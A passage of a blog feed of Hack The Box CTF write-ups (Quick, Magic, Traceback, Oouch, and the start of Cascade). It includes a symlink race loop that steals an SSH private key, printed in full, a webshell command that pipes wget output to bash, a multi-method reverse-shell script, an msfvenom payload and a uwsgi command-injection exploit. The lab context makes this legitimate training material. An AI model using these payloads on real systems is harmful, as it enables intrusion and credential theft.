srvadm\tServerName printerv2.quick.htb\tDocumentRoot /var/www/printer&lt;/VirtualHost&gt;I’ll add re-connect to the server and port forward my local port 1080 to the remote port 80: ssh -L 1080:127.0.0.1:80 sam@10.10.10.186. Then I’ll add printerv2.quick.htb to my local host file pointing to 127.0.0.1.The printer site has a login page but we don’t have valid credentials yet.We have access to the /var/www/printer directory where this applications is running and I can see the database credentials in the db.php file:sam@quick:/var/www/printer$ cat db.php &lt;?php$conn = new mysqli(\"localhost\",\"db_adm\",\"db_p4ss\",\"quick\");?&gt;The authentication page PHP code shows that the supplied password is hashed with MD5 and uses the fa salt.if(isset($_POST[\"email\"]) &amp;&amp; isset($_POST[\"password\"])){        $email=$_POST[\"email\"];        $password = $_POST[\"password\"];        $password = md5(crypt($password,'fa'));        $stmt=$conn-&gt;prepare(\"select email,password from users where email=? and password=?\");        $stmt-&gt;bind_param(\"ss\",$email,$password);        $stmt-&gt;execute();        $result = $stmt-&gt;get_result();        $num_rows = $result-&gt;num_rows;I can access the database and see two users configured:sam@quick:/var/www/printer$ mysql -u db_adm -D quick -p Enter password: [...]mysql&gt; show tables;+-----------------+| Tables_in_quick |+-----------------+| jobs            || tickets         || users           |+-----------------+3 rows in set (0.00 sec)mysql&gt; select * from users;+--------------+------------------+----------------------------------+| name         | email            | password                         |+--------------+------------------+----------------------------------+| Elisa        | elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d || Server Admin | srvadm@quick.htb | e626d51f8fbfd1124fdea88396c35d05 |+--------------+------------------+----------------------------------+2 rows in set (0.00 sec)Since I have access to the database, I can just change the srvadm user password to Quick4cc3$$ by using the same hash as the Elisa user account.mysql&gt; update users set password = 'c6c35ae1f3cb19438e0199cfa72a9d9d' where name='Server Admin';Query OK, 0 rows affected (0.00 sec)Rows matched: 1  Changed: 0  Warnings: 0And now I can log in to the printer application page with srvadm@quick.htb / Quick4cc3$$:We can add printers and point to our IP address:After adding a printer, we can see it in the list.After starting a netcat listener on port 9100, we can click the printer icon on the right to test connectivity. We see there’s a link to add a printer job.listening on [any] 9100 ...connect to [10.10.14.10] from (UNKNOWN) [10.10.10.186] 34600After adding the job, we get the content on port 9100:listening on [any] 9100 ...connect to [10.10.14.10] from (UNKNOWN) [10.10.10.186] 34656TestVAThe jobs.php file is the code that processes the print jobs. Here’s the relevant part that we’ll exploit.[...]    if(isset($_POST[\"submit\"]))\t{\t\t$title=$_POST[\"title\"];\t\t$file = date(\"Y-m-d_H:i:s\");\t\tfile_put_contents(\"/var/www/jobs/\".$file,$_POST[\"desc\"]);\t\tchmod(\"/var/www/printer/jobs/\".$file,\"0777\");\t\t$stmt=$conn-&gt;prepare(\"select ip,port from jobs\");\t\t$stmt-&gt;execute();\t\t$result=$stmt-&gt;get_result();\t\tif($result-&gt;num_rows &gt; 0)\t\t{\t\t\t$row=$result-&gt;fetch_assoc();\t\t\t$ip=$row[\"ip\"];\t\t\t$port=$row[\"port\"];\t\t\ttry\t\t\t{\t\t\t\t$connector = new NetworkPrintConnector($ip,$port);\t\t\t\tsleep(0.5); //Buffer for socket check\t\t\t\t$printer = new Printer($connector);\t\t\t\t$printer -&gt; text(file_get_contents(\"/var/www/jobs/\".$file));\t\t\t\t$printer -&gt; cut();\t\t\t\t$printer -&gt; close();\t\t\t\t$message=\"Job assigned\";\t\t\t\tunlink(\"/var/www/jobs/\".$file);\t\t\t}[..]            In short, the code does the following:      Creates a file named with the current time, like 2020-04-26_00:55:45 for example.        It writes to the file the contents submitted on the print job form        It opens a network socket to the remote printer and writes the content of the printer job  The race condition vulnerability here is the sleep(0.5) delay that was added. Because the print job file is modifiable by anyone (chmod 0777), it’s possible to swap the file by a symlink before the rest of the code reads the content. In other words, we can read or write any file as user srvadm.To abuse the file read and get the private key for srvadm, we can do it this way:  Loop and check if a file exists with the current time  If the file exists, delete it and replace it with a symlink to the SSH private key for srvadmwhile true ; do N=`date +%Y-%m-%d_%H:%M:%S` ; if [[ -r $N ]] ; then rm -f $N ; ln -s /home/srvadm/.ssh/id_rsa $N ; fi ; doneThe printer job will the send the private key to us instead of print job we submitted.listening on [any] 9100 ...connect to [10.10.14.10] from (UNKNOWN) [10.10.10.186] 58348-----BEGIN RSA PRIVATE KEY-----MIIEpQIBAAKCAQEAutSlpZLFoQfbaRT7O8rP8LsjE84QJPeWQJji6MF0S/RGCd4PAP1UWD26CAaDy4J7B2f5M/o5XEYIZeR+KKSh+mD//FOy+O3sqIX37anFqqvhJQ6D1L2WOskWoyZzGqb8r94gN9TXW8TRlz7hMqq2jfWBgGm3YVzMKYSYsWi6dVYTlVGYDLNb/88agUQGR8cANRis/2ckWK+GiyTo5pgZacnSN/61p1Ctv0IC/zCOI5p9CKndwhOvbmjzNvh/b0eXbYQ/Rp5ryLuSJLZ1aPrtK+LCnqjKK0hwH8gKkdZk/d3Ofq4ihRiQlakwPlsHy2am1O+smg0214HMyQQdn7lE9QIDAQABAoIBAG2zSKQkvxgjdeiIok/kcR5ns1wApagfHEFHxAxo8vFaN/m5QlQRa4H4lI/7y00mizi5CzFC3oVYtbumY5FXwagzZntxZegWQ9xb9Uy+X8sr6yIIGM5El75iroETpYhjvoFBSuedeOpwcaR+DlritBg8rFKLQFrR0ysZqVKaLMmRxPutqvhd1vOZDO4R/8ZMKggFnPC03AkgXkp3j8+ktSPW6THykwGnHXY/vkMAS2H3dBhmecA/Ks6V8h5htvybhDLuUMd++K6Fqo/BH14kq+y0Vfjs37vcNR5G7E+7hNw3zv5N8uchP23TZn2MynsujZ3TwbwOV5pw/CxO9nb7BSECgYEA5hMD4QRo35OwM/LCu5XCJjGardhHn83OIPUEmVePJ1SGCam6oxvcbAA5n83ERMXpDmE4I7y3CNrd9DS/uUae9q4CN/5gjEcc9Z1E81U64v7+H8VK3rueF6PinFsdov50tWJbxSYr0dIktSuUUPZrR+in5SOzP77kxZL4QtRE710CgYEAz+ItT/TMzWbl+9uLAyanQObr5gD1UmG5fdYcutTB+8JOXGKFDIyY+oVMwoU1jzk7KUtw8MzyuG8D1icVysRXHU8btn5t1l51RXu0HsBmJ9LaySWFRbNt9bc7FErajJr8Dakjb4gu9IKHcGchN2akH3KZ6lz/ayIAxFtadrTMinkCgYEAxpZzKq6btx/LX4uS+kdxpXX7hULBz/XcjiXvKkyhi9kxOPX/2voZcD9hfcYmOxZ466iOxIoHkuUX38oIEuwaGeJol9xBidN386kj8sUGZxiiUNoCne5jrxQObddX5XCtXELh43HnMNyqQpazFo8cWp0/DlGaTtN+s+r/zu9Z8SECgYEAtfvuZvyK/ZWC6AS9oTiJWovNH0DfggsC82IpLHVsjBUBvGaSyvWaRlXDaNZsmMElRXVBncwM/+BPn33/2c4f5QyH2i67wNpYF0e/2tvbkilIVqZ+ERKOxHhvQ8hzontbBCp5Vv4E/Q/3uTLPJUy5iL4ud7iJ8SOHQF4ox5pnJSECgYEA4gk6oVOHMVtxrXh3ASZyQIn6VKO+cIXHj72RAsFAD/98intvVsA3+DvKZu+NeroPtaI7NZv6muiaK7ZZgGcp4zEHRwxM+xQvxJpd3YzaKWZbCIPDDT/uNJx1AkN7Gr9v4WjccrSk1hitPE1w6cmBNStwaQWD+KUUEeWYUAx20RA=-----END RSA PRIVATE KEY-----To abuse the file write and put my public SSH in the srvadm user directory instead, we can do this:while true ; do N=`date +%Y-%m-%d_%H:%M:%S` ; if [[ ! -r $N ]] ; then rm -f $N ; ln -s /home/srvadm/.ssh/authorized_keys $N ; fi ; doneIn the print job form, I’ll send my SSH key:Now that my key has been uploaded, I can SSH to the server as user srvadm.root@kali:~# ssh srvadm@10.10.10.186Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)[...]Last login: Sat Apr 25 21:57:39 2020 from 10.10.14.10srvadm@quick:~$ iduid=1001(srvadm) gid=1001(srvadm) groups=1001(srvadm),999(printers)PrivescI looked at the files in srvadm’s home directories and found a few things that stood out:./.cache/conf.d:total 20drwxr-xr-x 2 srvadm srvadm 4096 Mar 20 06:23 .drwx------ 5 srvadm srvadm 4096 Mar 20 06:20 ..-rw-r--r-- 1 srvadm srvadm 4569 Mar 20 06:20 cupsd.conf-rw-r--r-- 1 srvadm srvadm 4038 Mar 20 06:23 printers.conf./.cache/logs:total 96drwxr-xr-x 2 srvadm srvadm  4096 Mar 20 06:46 .drwx------ 5 srvadm srvadm  4096 Mar 20 06:20 ..-rw-r--r-- 1 srvadm srvadm  9064 Mar 20 06:19 cups.log-rw-rw-r-- 1 srvadm srvadm 71479 Mar 20 06:46 debug.log-rw-rw-r-- 1 srvadm srvadm  1136 Mar 20 06:39 error.logThe .cache/conf.d/printers.conf file contains credentials:[...]MakeModel KONICA MINOLTA C554SeriesPS(P)DeviceURI https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printerState Idle[...]We can URL decode many ways, such as using PHP:srvadm@quick:~$ php -r 'echo urldecode(\"srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb\\n\");'srvadm@quick.htb:&amp;ftQ4K3SGde8?@printerv3.quick.htbThe password &amp;ftQ4K3SGde8? is the root password. We can use su and get root access.srvadm@quick:~$ suPassword: root@quick:/home/srvadm# iduid=0(root) gid=0(root) groups=0(root)root@quick:/home/srvadm# cat /root/root.txtca70f7b71[...]"
  },
  
  {
    "title": "Magic - Hack The Box",
    "url": "/posts/htb-writeup-magic/",
    "categories": "hackthebox, infosec",
    "tags": "sqli, upload, php, mysql, port forward, suid, path hijack",
    "date": "2020-08-22 00:00:00 +0800",
    





    
    "snippet": "Magic starts with a classic PHP insecure upload vulnerability that let us place a webshell on the target host and then we exploit a subtle webserver misconfiguration to execute the webshell (even t...",
    "content": "Magic starts with a classic PHP insecure upload vulnerability that let us place a webshell on the target host and then we exploit a subtle webserver misconfiguration to execute the webshell (even though the file name doesn’t end with a .php extension). Once we land a shell, we escalate to another user with credentials found in MySQL and priv esc to root by exploiting a path hijack vulnerability in a SUID binary.Summary  Bypass the login page with a simple SQL injection  Upload a PHP webshell after bypassing the file type and extension restriction  Find DB credentials, then find the password for user theseus in the MySQL database  Privesc by hijacking the PATH of a SUID binaryPortscanWebsite and initial shellThe website is just an image gallery with a link to upload new images at the bottom.The upload page is protected by a login form for which we don’t have valid credentials.We can try some default credentials like admin / admin on the login page but they don’t work. Next we’ll try a very simple SQL injection like ' or '1'='1 in the password field. This makes the password condition return True and we’re able to pass the authentication check.The application filters out what we can upload so we’re not able to upload a PHP webshell with the .php extension.The application also checks the content of the file so even if we rename the file to a valid image extension it fails the upload check.By using a valid PNG image and inserting PHP code in the middle of the file we can pass the magic bytes check and the application will think it’s a valid image.To bypass the extension check, we can append .png and it will still execute the file as PHP code when we send the GET request to /images/uploads/snow.php.png. This happens because of a subtle misconfiguration in the htaccess configuration file. The regular expression only checks if the .php string is present in the filename, not that the file name actually ends with .php.&lt;FilesMatch \".+\\.ph(p([3457s]|\\-s)?|t|tml)\"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;&lt;Files ~ \"\\.(sh|sql)\"&gt;   order deny,allow   deny from allNow that we have uploaded the webshell we have remote code execution:With the PHP webshell, I can fetch a bash script from my box and get a reverse shell through Perl:http://magic.htb/images/uploads/snow.php.png?c=wget%20-O%20-%20http://10.10.14.35/shell.sh%20|%20bashThe bash script will try various methods to get a reverse shell back to us:if command -v python &gt; /dev/null 2&gt;&amp;1; then        python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"10.10.14.35\",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);'        exit;fiif command -v perl &gt; /dev/null 2&gt;&amp;1; then        perl -e 'use Socket;$i=\"10.10.14.35\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};'        exit;fiif command -v nc &gt; /dev/null 2&gt;&amp;1; then        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.35 443 &gt;/tmp/f        exit;fiif command -v sh &gt; /dev/null 2&gt;&amp;1; then        /bin/sh -i &gt;&amp; /dev/tcp/10.10.14.35/443 0&gt;&amp;1        exit;fiPrivesc to user theseusIn the web application directory /var/www/Magic, we find a PHP script db.php5 that contains the database configuration file for the web application with the mysql username, password and database name.&lt;?phpclass Database{    private static $dbName = 'Magic' ;    private static $dbHost = 'localhost' ;    private static $dbUsername = 'theseus';    private static $dbUserPassword = 'iamkingtheseus';The mysql CLI client isn’t installed on the machine so we’ll have to do port forwarding to reach port 3306 listening on localhost. There’s many ways to do this, here I’ll use a meterpreter shell to port forward 3306.msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o met LHOST=10.10.14.35 LPORT=5555We can now log in to MySQL and we find another password in the login table.We can use the Th3s3usW4sK1ng to su to user theseus:Privesc to rootLooking at SUID files, /bin/sysinfo stands out because it’s not a standard Linux binary.The program just seems to be running a bunch of standard Linux programs like free.By using ltrace, we can confirm this and see that the program uses the popen function to execute programs:The program is vulnerable because we control the PATH and the program doesn’t use the absolute path to execute the programs so we can execute anything we want as root. To get root I’ll just create a script that sets the SUID bit on  /bin/bash, name it free and call /bin/sysinfo after setting the path to my current directory so it doesn’t execute the real free program but my own script."
  },
  
  {
    "title": "Traceback - Hack The Box",
    "url": "/posts/htb-writeup-traceback/",
    "categories": "hackthebox, infosec",
    "tags": "php, webshell, lua, update-motd.d",
    "date": "2020-08-15 00:00:00 +0800",
    





    
    "snippet": "Traceback was an easy box where you had to look for an existing webshell on the box, then use it to get the initial foothold. Then there was some typical sudo stuff with a LUA interpreter giving us...",
    "content": "Traceback was an easy box where you had to look for an existing webshell on the box, then use it to get the initial foothold. Then there was some typical sudo stuff with a LUA interpreter giving us access as another user then for privesc we find that we can write to  /etc/update-motd.d and those scripts get executed by root.Summary  Find a hint in the HTML comments of the mainpage about popular webshells  Find hidden webshell by trying out popular webshells found by googling the HTML comments hint  Get a reverse shell as user webadmin, and use LUA interpreter to get a shell as sysadmin  Watching running process with pspy, find motd update process running as root  Edit and log in by SSH again to trigger the scriptPortscanroot@kali:~/htb/traceback# nmap -T4 -sC -sV -p- 10.10.10.181Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-15 15:48 EDTNmap scan report for traceback.htb (10.10.10.181)Host is up (0.018s latency).Not shown: 65533 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Help usService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelFinding the webshellAs we can see, the website has been defaced by some elite hacker named Xh4H.The HTML source code reveals a hint:&lt;body&gt;\t&lt;center&gt;\t\t&lt;h1&gt;This site has been owned&lt;/h1&gt;\t\t&lt;h2&gt;I have left a backdoor for all the net. FREE INTERNETZZZ&lt;/h2&gt;\t\t&lt;h3&gt; - Xh4H - &lt;/h3&gt;\t\t&lt;!--Some of the best web shells that you might need ;)--&gt;\t&lt;/center&gt;&lt;/body&gt;Googling Some of the best web shells that you might need, I end up on https://github.com/TheBinitGhimire/Web-Shells.I tried each webshell filename on the box and got a hit on http://10.10.10.181/smevk.phpThe creds are admin / admin.To get a shell, I simply use a common payload with the Execute function on the webshell:Privesc from webadmin to sysadminFirst, I’ll add my SSH key to the webadmin’s authorized_keys file so I can log in with a proper SSH shell.Looking at my home directory, I see a program called luvit owned by sysadmin and a privesc.lua file that writes an SSH key to the sysadmin folderThe note.txt file says:webadmin@traceback:~$ cat note.txt - sysadmin -I have left this tool to practice Lua. Contact me if you have any question.So it’s pretty clear we need to use the LUA interpreter to escalate to sysadmin.We can run the interpreter as sysadmin:webadmin@traceback:~$ sudo -lMatching Defaults entries for webadmin on traceback:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser webadmin may run the following commands on traceback:    (sysadmin) NOPASSWD: /home/webadmin/luvitWe just need to call /bin/bash to get a shell as sysadmin…Privesc from sysadmin to rootAgain, let’s dump our SSH key so we can get a real shell.We can now read the flag:$ cat user.txtc2434970[...]Using pspy, I can see that the /bin/sh /etc/update-motd.d/80-esm script gets executed by root every time someone logs in.There’s a script that runs every 30 seconds to restore the original copies of files in /etc/update-motd.d/ so it’s obvious that this is the way in for this box.All the files are writable by sysadmin so it’s game over at this point.We just need to change the 80-esm file to something like this and it’ll make bash suid so we can get root:"
  },
  
  {
    "title": "Oouch - Hack The Box",
    "url": "/posts/htb-writeup-oouch/",
    "categories": "hackthebox, infosec",
    "tags": "linux, ftp, python, flask, xss, oauth, api, dbus, uwsgi",
    "date": "2020-08-01 00:00:00 +0800",
    





    
    "snippet": "Ooauth was a pretty tough box because I was unfamiliar with Oauth and it took a while to figure out the bits and pieces to chain together. The priv esc was pretty cool, we had to talk to the uwsgi ...",
    "content": "Ooauth was a pretty tough box because I was unfamiliar with Oauth and it took a while to figure out the bits and pieces to chain together. The priv esc was pretty cool, we had to talk to the uwsgi socket directly to manipulate the REMOTE_ADDR variable and exploit a command injection vulnerability in the script calling iptables.Portscanroot@kali:~/htb/ouch# nmap -p- 10.10.10.177Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-02 15:58 ESTNmap scan report for oouch.htb (10.10.10.177)Host is up (0.019s latency).Not shown: 65531 closed portsPORT     STATE SERVICE21/tcp   open  ftp22/tcp   open  ssh5000/tcp open  upnp8000/tcp open  http-altFTP serverThe FTP server allows anonymous access and contains a single file.root@kali:~/htb/ouch# ftp 10.10.10.177Connected to 10.10.10.177.220 qtc's development serverName (10.10.10.177:root): anonymous230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls200 PORT command successful. Consider using PASV.150 Here comes the directory listing.-rw-r--r--    1 ftp      ftp            49 Feb 11 18:34 project.txt226 Directory send OK.The file contains some information about what kind of web technology runs the two web services we saw earlier on port 5000 and 8000.root@kali:~/htb/ouch# cat project.txt Flask -&gt; ConsumerDjango -&gt; Authorization ServerWeb site enumerationThe site on port 5000 requires an account to log in but fortunately we can register a new account.After logging in, we have access to a couple of different pages.The user profile section shows that no account has been connected but we’re not sure what this is yet.The documents area is still under construction and is only available to administrators.There’s also a contact section. Now that’s pretty interesting because it could be a target for an XSS since the page says the messages are forwarded to the administrator.XSS on the contact formThere is some filtering done on the message input and we get blacklisted for about a minute whenever we try payloads that contain blacklisted words like: alert, &lt;script&gt;, etc.The funny part of this XSS is that it’s not really a real XSS where javascript is executed in the victim’s browser. Here we don’t even need to send a javascript payload, the XSS bot is configured to following whatever link we give it so entering http://10.10.14.21 generates a callback on our VM.This XSS will come in handy later, for now we’ll move on to directory and file bruteforcing to find additional stuff on the webserver.GobusterUsing gobuster, we found an interesting /oauth directory:root@kali:~/htb/ouch# gobuster dir -w ~/tools/SecLists/Discovery/Web-Content/big.txt -u http://10.10.10.177:5000[...]/about (Status: 302)/contact (Status: 302)/documents (Status: 302)/home (Status: 302)/login (Status: 200)/logout (Status: 302)/oauth (Status: 302)/profile (Status: 302)/register (Status: 200)Oauth consumer serverThe connect page presents another login prompt but this requires a different account, probably an account that will need to be linked to our main profile.Oauth authorization serverThat web server running on port 8000 is the Oauth authorization server and we can create the account there.Once we go back to the connect page, we can authorize the application as follows.Then the new account gets linked to the consumer server.Unfortunately that doesn’t give us anything new since our account is not an administrator.XSS to authorize as administratorWhen we examine the Burp history from the authorization process, we see the following in the POST request to the authorization server:  The client_id is static. This is the application ID configured on the authorization server.  The response_type code tells the authorization what kind of authorization ‘token’ should be used.  The redirect_uri is self-explanatory, if we could change this we could steal the administrator’s session ID cookie but it’s configured on the authorization server as part of the application configuration and we cannot change it.  By experimentation we can find that the CSRF token isn’t even used / verified.The next GET request to the consumer just uses the token code that was returned by the authorization server. This will bind the accounts together on the consumer server.What we need to do here is have an administrator submit the token code that the authorization server returned to us and that will give us administrator privileges on that application. We must drop the initial request our client makes though because the code can only be used once. Using the contact form we can perform the SSRF to get the admin to authorize us.That part is kinda weird, it didn’t work the first time, I had to do it a couple of times and eventually got it working and was able to get to the documents section.The documents has the develop:supermegasecureklarabubu123! credentials and an API endpoint /api/get_userThe next hint is also important as it tells us we can get SSH keys.Enumerating the Oauth and API endpoints on the authorization serverThere’s a /oauth/applications directory but even with the credentials above we can’t get passed the HTTP basic authentication.The hint talked about applications registration so by using the following link we can get to the app registration page:http://authorization.oouch.htb:8000/oauth/applications/register/Now that we can add applications, we can exploit the redirect_uri and use the XSS again to steal the administrator’s sessionid cookie.The python SimpleHTTPServer module doesn’t display the headers by default so we’ll just use Wireshark to see the Cookie HTTP header.sessionid=ir2kgnr7ih1q5h6ccbnj0a423lq7egfsGetting the SSH credentials using the APINow that we got the cookie, we can just use it to log in as qtc.To get a token for the API endpoints, we’ll first register a new application with Client credentials as the Authorization grant type.Note of the credentials:  client id: dqzxtaT48HybcM5YtruDCjCjuOSQzVdhg1eHyhiN  client secret: rSzD9UWKG1wI4GUmAuchsFm8jYP5M1TsxpLdhSTczNbIgJxkebFCRmeUbvW1FdNqUNhzrkjoMpFZtjONYi597mHyzpIYOTdaqKUJgdLoADqnGTTc8TdIpwPdtriWYTBUUsing the /oauth/token, we can log in with the application credentials and get an access_token.Using the Authorization token we can use the API and see that we’re user qtcAfter some fuzzing based on the SSH hint earlier, we found the get_ssh endpoint which returns the SSH key for user qtcPrivescThat SSH shell is on the host and we see that the two web servers are running in different containers.After uploading pspy we can check if any processes are running in a cronjob.We see here that iptables is used to blacklist our IP when we trigger the XSS filter and that there’s a get_pwnd script that runs. This script is probably the XSS bot that fetches the URL submitted on the contact form.There’s a dbus configuration that accept messages from the www-data user. This is probably used to pass messages between the container and the host containing the IPs to be blocked by iptables. This a command injection vector if we can control the IP address sent to the iptables command.qtc@oouch:/etc/dbus-1/system.d$ cat htb.oouch.Block.conf &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!-- -*- XML -*- --&gt;&lt;!DOCTYPE busconfig PUBLIC \"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN\" \"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd\"&gt;&lt;busconfig&gt;    &lt;policy user=\"root\"&gt;        &lt;allow own=\"htb.oouch.Block\"/&gt;    &lt;/policy&gt;\t&lt;policy user=\"www-data\"&gt;\t\t&lt;allow send_destination=\"htb.oouch.Block\"/&gt;\t\t&lt;allow receive_sender=\"htb.oouch.Block\"/&gt;\t&lt;/policy&gt;&lt;/busconfig&gt;We can SSH directly to the container running the web application.The application resides in /code. The interesting bit for us now is the contact form code:def contact():    '''    The contact page is required to abuse the Oauth vulnerabilities. This endpoint allows the user to send messages using a textfield.    The messages are scanned for valid url's and these urls are saved to a file on disk. A cronjob will view the files regulary and    invoke requests on the corresponding urls.    Parameters:        None    Returns:        render                (Render)                  Renders the contact page.    '''    # First we need to load the contact form    form = ContactForm()    # If the form was already submitted, we process the contents    if form.validate_on_submit():        # First apply our primitive xss filter        if primitive_xss.search(form.textfield.data):            bus = dbus.SystemBus()            block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')            block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')            client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)              response = block_iface.Block(client_ip)            bus.close()            return render_template('hacker.html', title='Hacker')        # The regex defined at the beginning of this file checks for valid urls        url = regex.search(form.textfield.data)        if url:            # If an url was found, we try to save it to the file /code/urls.txt            try:                with open(\"/code/urls.txt\", \"a\") as url_file:                    print(url.group(0), file=url_file)            except:                print(\"Error while openeing 'urls.txt'\")        # In any case, we inform the user that has message has been sent        return render_template('contact.html', title='Contact', send=True, form=form)    # Except the functions goes up to here. In this case, no form was submitted and we do not need to inform the user    return render_template('contact.html', title='Contact', send=False, form=form)In a nutshell, when the XSS filter is triggered, the application uses the REMOTE_ADDR parameter to send it through the dbus interface to the upstream iptables command. We can’t spoof or modify this REMOTE_ADDR variable remotely so we’ll have to exploit this another way.The uwsgi.ini file shows that a UNIX socket is used to communicate between the webserver and the flask application:[uwsgi]module = oouch:appuid = www-datagid = www-datamaster = trueprocesses = 10socket = /tmp/uwsgi.socketchmod-sock = 777vacuum = truedie-on-term = trueThe permissions on the socket allow us to read and write to the socket:qtc@aeb4525789d8:/code$ ls -l /tmptotal 0srw-rw-rw- 1 www-data www-data 0 Mar  2 15:21 uwsgi.socketWe can write using the uwsgi protocol directly to the socket and manipulate the values. The code below is an ugly hack put together from some examples found online. The payload I used here sets the SUID bit on /bin/bash: $(chmod u+s /bin/bash)import sysimport argparseimport socketimport structfrom binascii import hexlifyassert sys.version_info[0] == 3, 'Use Python 3.'def force_bytes(value):    if isinstance(value, bytes):        return value    return str(value).encode('utf-8')def encode_uwsgi_vars(values):    \"\"\"    Encode a list of key-value pairs into an uWSGI request header structure.    \"\"\"    # See http://uwsgi-docs.readthedocs.io/en/latest/Protocol.html#the-uwsgi-vars    buffer = []    for key, value in values:        key_enc = force_bytes(key)        val_enc = force_bytes(value)        buffer.append(struct.pack('&lt;H', len(key_enc)))        buffer.append(key_enc)        buffer.append(struct.pack('&lt;H', len(val_enc)))        buffer.append(val_enc)    return b''.join(buffer)def send_uwsgi_request(socket, header_content):    data = encode_uwsgi_vars(header_content)    header = struct.pack(        '&lt;BHB',        0,  # modifier1: 0 - WSGI (Python) request        len(data),  # data size        0,  # modifier2: 0 - always zero    )    print(header)    socket.sendall(header)    socket.sendall(data)    print(socket.sendall('csrf_token=Ijg3YjgyMTRhNDQxZTJhNWUyMTQ1NGI1OTIzYjNjOGEyYzAzMDFkMGQi.Xlv6qg.cxrU6xp-WQWDDj5_IzD-iF3D-70&amp;textfield=alert&amp;submit=Send'.encode('utf-8')))def dump_from_socket(socket, width=32):    while True:        chunk = socket.recv(width)        print(chunk)        if not chunk:            break        print('%-*s  %s' % (            width * 2,            hexlify(chunk).decode(),            ''.join(b if b.isprintable() else '.' for b in chunk.decode('ascii', 'replace'))        ))def talk_to_uwsgi(host, port, path):    #s = socket.socket()    #s.connect((host, port))    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)    s.connect(\"/tmp/uwsgi.socket\")    print(s)    send_uwsgi_request(s, {        'PATH_INFO': path,        'HTTP_HOST': 'consumer.oouch.htb',        'REQUEST_METHOD': 'POST',        'HTTP_COOKIE': 'session=.eJy9kb9OAzEMxl8lzcJSIV_-p0-BYGCAqnIcpz1xvUNNKoaq706AEbEggRfbsn_6_MkXuSsT1gNXuXm6SNF6kkeuFfcs1_JuYqwspmUvxlm0RSBRH4p2GKt47Tu3cntdf-fueT_WdsI2LrN4OH9C5TytxCNPtBxZ1Hl5q4Tz6pf8jWD6Ldu4NvEsf8D_zHJa0n9L4jQSf4hu1_3PJ64HuSk4Ve7tmOVGGkiKoh4yhaJ7qKjAQ7A-MJG2jqwyBDbZHC0mg4N22igXSibkpDNYn4pz5CK5HpGyRQs2AKUSjbOANCQXQoy-AID3JRVIznkXiy3edBNUT2XXlhee-z3Bp6AGg8YMrNByr61JNiqdNAVUBBqGDLlz58qnLxODvL4Dkk_jDQ.XlvGhA.DK61IKezdy9GLX14VLDcSgPviD4',        'QUERY_STRING': '',        'CONTENT_LENGTH': 130,        'REMOTE_ADDR': '$(chmod u+s /bin/bash)',        'CONTENT_TYPE': 'application/x-www-form-urlencoded'    }.items())    dump_from_socket(s)    s.close()def main():    ap = argparse.ArgumentParser()    ap.add_argument('--host', default='localhost')    ap.add_argument('--port', type=int, default=9090)    ap.add_argument('path')    args = ap.parse_args()    talk_to_uwsgi(host=args.host, port=args.port, path=args.path)if __name__ == '__main__':    main()After executing the exploit, we can run /bin/bash as root and get the final flag.qtc@aeb4525789d8:/tmp$ python /tmp/exploit.py /contact"
  },
  
  {
    "title": "Cascade - Hack The Box",
    "url": "/posts/htb-writeup-cascade/",
    "categories": "hackthebox, infosec",
    "tags": "ldap, smb, vnc, reversing, crypto, tombstone",
    "date": "2020-07-25 00:00:00 +0800",
    





    
    "snippet": "Cascade was a simple and straightforward enumeration-focused Windows box. We find the credentials for the initial account in a custom LDAP attibute then enumerate SMB shares, finding VNC credential...",
    "content": "Cascade was a simple and straightforward enumeration-focused Windows box. We find the credentials for the initial account in a custom LDAP attibute then enumerate SMB shares, finding VNC credentials which can be decrypted. With those creds we find an SQlite database that contains encrypted credentials for yet another user. To decrypt the password we have to reverse a simple .NET application located on one of the shares. The final privesc involves getting the admin password from tombstone, a feature in AD that keeps deleted objects for a period of time.Summary  Get a list of users from the LDAP directory  Find the password for user r.thompson in the cascadeLegacyPwd LDAP attribute  Enumerate Data SMB share, find VNC encrypted password for user s.smith  Decrypt VNC password, log in and find an SQlite database with the encrypted password for ArkSvc user  Download the .NET crypto application, reverse it, find cipher, key and IV then decrypt the ArkAvc password  Log in as ArkSvc, recover old deleted TempAdmin account password then log in as AdministratorPortscanSMB reconWe can use crackmapexec to check out the domain name on the machine and check if there are any SMB shares accessible. There 